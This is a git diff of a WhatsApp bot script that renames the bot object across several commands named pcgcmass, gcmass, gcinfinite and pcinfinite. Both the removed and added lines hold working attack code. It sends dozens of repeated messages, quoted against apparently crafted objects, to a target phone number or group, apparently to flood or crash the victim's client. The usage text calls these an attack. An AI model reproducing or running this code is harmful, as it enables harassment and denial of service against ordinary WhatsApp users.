-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
             await sleep(30000)
             }
             break
@@ -7681,59 +7659,59 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
             }
             break
@@ -7755,59 +7733,59 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
             await sleep(30000)
             reply(mess.success)
             break
@@ -7829,33 +7807,33 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
             break
 case 'pcfast':               
            	
@@ -7875,31 +7853,31 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxx
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
